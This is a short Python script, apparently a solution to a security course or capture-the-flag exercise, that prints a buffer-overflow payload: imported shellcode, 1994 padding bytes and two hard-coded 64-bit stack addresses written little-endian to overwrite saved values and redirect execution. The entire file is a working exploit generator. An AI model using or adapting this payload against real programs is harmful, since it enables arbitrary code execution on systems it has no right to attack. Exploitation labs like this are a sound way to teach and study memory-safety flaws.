#!/usr/bin/env python3

import sys

from shellcode import shellcode
p = 0x7ffffff6b0d8
a = 0x7ffffff6a8c0
sys.stdout.buffer.write(shellcode + b'\x00' * 1994 + a.to_bytes(8,'little' )+ p.to_bytes(8,'little'))
